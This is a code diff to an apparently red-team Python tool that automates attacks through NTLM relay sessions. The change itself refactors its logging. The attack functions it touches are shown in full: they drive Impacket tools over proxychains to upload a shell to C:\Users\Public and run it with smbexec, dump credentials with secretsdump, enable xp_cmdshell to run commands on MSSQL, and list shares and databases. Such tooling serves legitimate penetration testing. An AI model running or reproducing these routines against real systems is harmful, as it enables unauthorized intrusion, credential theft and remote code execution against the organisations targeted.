@@ -7,6 +7,7 @@ import requests
 from subprocess import run, PIPE
 import concurrent.futures
 import argparse
+from datetime import datetime
 
 
 def main():    
@@ -66,6 +67,49 @@ def validate_arguments(args):
             sys.exit(1)
 
 
+def get_current_datetime_string():
+    """Returns the current date and time as a formatted string."""
+    current_datetime = datetime.now()
+    datetime_string = current_datetime.strftime('%Y-%m-%d %H:%M:%S')
+    return datetime_string
+
+
+def log_output(file_path, technique, relay_user, relay_host, relay_port, *data_entries):
+    """
+    Logs data entries to a specified file with a timestamp, relay details,
+    and checks if multiple data entries exist before appending newlines.
+    
+    Parameters:
+    - file_path: The path to the log file.
+    - technique: The technique used for the relay attack.
+    - relay_user: The user used in the relay attack.
+    - relay_host: The host used in the relay attack.
+    - relay_port: The port used in the relay attack.
+    - data_entries: Variable number of data strings to be logged.
+    """
+    # Combine data entries with newlines if there are multiple entries
+    combined_data = "\n".join(data_entries) if len(data_entries) > 1 else "".join(data_entries)
+    
+    # Print the data to the console
+    print(combined_data)
+
+    with open(file_path, 'a+', encoding=sys.getfilesystemencoding(), errors='replace') as file:
+        file.seek(0)  # Move the file pointer to the start of the file.
+        first_char = file.read(1)  # Try to read the first character to determine if the file is empty.
+
+        header = f"Performing {technique} with user {relay_user} against {relay_host}:{relay_port} at {get_current_datetime_string()}\n"
+        
+        if not first_char:
+            # File is empty. Write the initial timestamp, details, and data.
+            file.write(header)
+            file.write(combined_data)
+        else:
+            # File is not empty. Append new timestamp, details, and data.
+            file.seek(0, 2)  # Ensure the file pointer is at the end for appending.
+            file.write(f"\n{header}")
+            file.write(combined_data)
+
+
 def get_relay_info():
     # Basic test to get relay info for testing:
     # curl -v http://localhost:9090/ntlmrelayx/api/v1.0/relays | python -m json.tool
@@ -91,37 +135,42 @@ def list_shares(relay_user, relay_host, relay_port, is_admin):
         input = "shares\nexit\n"
     print(f"Attempting to list SMB shares as '{connection_string}'.")
     try:
-        proc = run(['proxychains', 'smbclient.py', '-no-pass', '-port', relay_port, connection_string], stdout=PIPE,
-            input=input, encoding='ascii')
-        print(proc.stdout)
-        with open(f'smb_shares.{relay_user.replace("/", ".")}.{relay_host}.txt', 'a') as file:
-            file.write(f'{proc.stdout}')
+        proc = run(['proxychains', 'smbclient.py', '-no-pass', '-port', relay_port, connection_string], stdout=PIPE, input=input, encoding='ascii')
+        file_path = f'smb_shares.{relay_user.replace("/", ".")}.{relay_host}.txt'
+        log_output(file_path, "--smb-shares", relay_user, relay_host, relay_port, proc.stdout)
     except Exception as error:
         print(f"Error: '{error}' listing SMB shares as '{connection_string}'.")
 
 
 def smb_shell(relay_user, relay_host, relay_port, shell_path):
-    connection_string = relay_user + "@" + relay_host
-    input = f"shares\nuse C$\nls\ncd Users\\Public\nput {shell_path}\nls\nexit\n"
+    connection_string = f"{relay_user}@{relay_host}"
+    input1 = f"shares\nuse C$\nls\ncd Users\\Public\nput {shell_path}\nls\nexit\n"
+    input2 = f"C:\\Users\\Public\\{shell_path}\nexit\n"
 
-    print(f"Attempting to upload {shell_path} to C:\\Users\\Public\\{shell_path} as '{connection_string}'.")
+    output = []  # Collect output from both commands
+
+    # Attempt to run first command
     try:
-        proc = run(['proxychains', 'smbclient.py', '-no-pass', '-port', relay_port, connection_string], stdout=PIPE,
-            input=input, encoding='ascii')
-        print(proc.stdout)
-        with open(f'smb_shell.{relay_user.replace("/", ".")}.{relay_host}.txt', 'a') as file:
-            file.write(f'{proc.stdout}')
+        print(f"Attempting to upload {shell_path} to C:\\Users\\Public\\{shell_path} as '{connection_string}'.")
+        proc = run(['proxychains', 'smbclient.py', '-no-pass', '-port', relay_port, connection_string], stdout=PIPE, input=input1, encoding='ascii')
+        output.append(proc.stdout)
     except Exception as error:
-        print(f"Error: '{error}' uploading C:\\Users\\Public\\{shell_path} as '{connection_string}'.")
-    print(f"Attempting to smbexec C:\\Users\\Public\\{shell_path} as '{connection_string}'.")
+        print(f"Error during smbclient.py operation: {error}")
+
+    # Attempt to run second command
     try:
-        proc2 = run(['proxychains', 'smbexec.py', '-no-pass', '-port', relay_port, connection_string], stdout=PIPE,
-            input=f'C:\\Users\\Public\\{shell_path}\nexit\n', encoding='ascii')
-        print(proc2.stdout)
-        with open(f'smb_shell.{relay_user.replace("/", ".")}.{relay_host}.txt', 'a') as file:
-            file.write(f'{proc2.stdout}')
+        print(f"Attempting to smbexec C:\\Users\\Public\\{shell_path} as '{connection_string}'.")
+        proc2 = run(['proxychains', 'smbexec.py', '-no-pass', '-port', relay_port, connection_string], stdout=PIPE, input=input2, encoding='ascii')
+        output.append(proc2.stdout)
     except Exception as error:
-        print(f"Error: '{error}' running smbexec as '{connection_string}'.")
+        print(f"Error during smbexec.py operation: {error}")
+
+    # Log the output if any command succeeded
+    if output:
+        file_path = f'smb_shell.{relay_user.replace("/", ".")}.{relay_host}.txt'
+        log_output(file_path, "--smb-shell", relay_user, relay_host, relay_port, *output)
+    else:
+        print("No output to log due to errors in both smb_exec commands.")
 
 
 def secretsdump(relay_user, relay_host):
@@ -130,8 +179,7 @@ def secretsdump(relay_user, relay_host):
     outfile = f"secretsdump.{out_user}.{relay_host}.txt"
     print(f"Attempting secretsdump.py as '{connection_string}'.")
     try:
-        proc = run(['proxychains', 'secretsdump.py', '-ts', '-no-pass', '-o', outfile, connection_string], stdout=PIPE,
-            input='', encoding='ascii')
+        proc = run(['proxychains', 'secretsdump.py', '-ts', '-no-pass', '-o', outfile, connection_string], stdout=PIPE, input='', encoding='ascii')
         print(proc.stdout)
     except Exception as error:
         print(f"Error: '{error}' dumping secrets from '{connection_string}'.")
@@ -149,11 +197,9 @@ def mssql_exec(relay_user, relay_host, relay_port, method, command):
         print('[!] This is not a recommended method, and could cause havoc.')
         input = "enable_xp_cmdshell\nxp_cmdshell " + command + "\ndisable_xp_cmdshell\n"
     try:
-        proc = run(['proxychains', 'mssqlclient.py', '-windows-auth', '-no-pass', '-port', relay_port, connection_string], stdout=PIPE,
-            input=input, encoding='ascii')
-        with open(f'mssql_exec.{relay_user.replace("/", ".")}.{relay_host}.txt', 'a') as file:
-            file.write(f'{proc.stdout}')
-        print(proc.stdout)
+        proc = run(['proxychains', 'mssqlclient.py', '-windows-auth', '-no-pass', '-port', relay_port, connection_string], stdout=PIPE, input=input, encoding='ascii')
+        file_path = f'mssql_exec.{relay_user.replace("/", ".")}.{relay_host}.txt'
+        log_output(file_path, f"--mssql-exec method {method}", relay_user, relay_host, relay_port, proc.stdout)
     except Exception as error:
         print(f"Error: '{error}' executing command '{command}' as '{connection_string}'.")
 
@@ -163,11 +209,9 @@ def list_databases(relay_user, relay_host, relay_port):
     input = 'SELECT CURRENT_USER;\nSELECT name FROM master.sys.databases;\nexit\n'
     print(f"Attempting to list current db user and MSSQL databases as '{connection_string}'.")
     try:
-        proc = run(['proxychains', 'mssqlclient.py', '-windows-auth', '-no-pass', '-port', relay_port, connection_string], stdout=PIPE,
-            input=input, encoding='ascii')
-        print(proc.stdout)
-        with open(f'mssql_databases.{relay_user.replace("/", ".")}.{relay_host}.txt', 'a') as file:
-            file.write(f'{proc.stdout}')
+        proc = run(['proxychains', 'mssqlclient.py', '-windows-auth', '-no-pass', '-port', relay_port, connection_string], stdout=PIPE, input=input, encoding='ascii')
+        file_path = f'mssql_databases.{relay_user.replace("/", ".")}.{relay_host}.txt'
+        log_output(file_path, "--mssql-dbs", relay_user, relay_host, relay_port, proc.stdout)
     except Exception as error:
         print(f"Error: '{error}' listing MSSQL databases as '{connection_string}'.")
 
